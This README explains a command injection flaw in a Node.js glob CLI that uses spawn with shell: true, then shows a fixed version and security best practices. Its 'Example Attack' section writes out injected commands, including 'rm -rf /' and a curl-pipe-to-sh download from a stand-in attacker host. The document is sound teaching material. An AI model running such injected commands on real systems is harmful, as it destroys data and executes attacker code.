# Glob CLI - Command Injection Vulnerability Demo

This directory contains a demonstration of a command injection vulnerability in a CLI tool.

## The Vulnerability

The vulnerable code in `glob-cli.js` uses `child_process.spawn()` with `shell: true` and user-provided input:

```javascript
const command = options.cmd.replace('{}', file);
const child = spawn(command, {
  shell: true,  // DANGEROUS!
  stdio: 'inherit'
});
```

## How the Attack Works

When `shell: true` is used, the command is executed through a shell (`/bin/sh` on Unix, `cmd.exe` on Windows). This allows shell metacharacters and command chaining:

### Example Attack:

```bash
# Intended use:
./glob-cli.js "*.txt" -c "cat {}"

# Malicious use (command injection):
./glob-cli.js "*.txt" -c "cat {} ; rm -rf / #"
./glob-cli.js "*.txt" -c "cat {} && curl evil.com/steal.sh | sh"
./glob-cli.js "*.txt" -c "cat {} ; echo hacked > /tmp/pwned"
```

The attacker can:
- Execute arbitrary commands
- Chain multiple commands with `;`, `&&`, `||`, `|`
- Redirect output
- Download and execute malicious scripts
- Delete files
- Exfiltrate data

## The Fix

The secure version (`glob-cli-fixed.js`) addresses this vulnerability by:

1. **Removing `shell: true`**: Execute commands directly without shell interpretation
2. **Parsing arguments safely**: Split command into executable and arguments array
3. **Using proper escaping**: Pass file paths as separate arguments

```javascript
// Parse command into executable and arguments
const cmdParts = options.cmd.split(/\s+/);
const executable = cmdParts[0];
const args = cmdParts.slice(1).map(arg => arg.replace('{}', file));

// Execute without shell
const child = spawn(executable, args, {
  stdio: 'inherit'
});
```

### Limitations

The fixed version uses a simple whitespace-based split for command parsing. This means:
- Arguments with spaces must not be quoted (e.g., use `file.txt` not `"file with spaces.txt"`)
- For production use with complex commands, consider using a proper shell argument parser library
- The security benefit (no command injection) far outweighs this limitation

## Security Best Practices

1. **Never use `shell: true` with user input**
2. **Use argument arrays instead of command strings**
3. **Validate and sanitize all user inputs**
4. **Use allowlists for commands when possible**
5. **Run with least privilege**

## Testing

See `test-glob-cli.js` for security tests that verify:
- Normal operation works correctly
- Command injection attempts are blocked
- Shell metacharacters are not interpreted

## References

- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Node.js Child Process Security](https://nodejs.org/en/docs/guides/security/)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
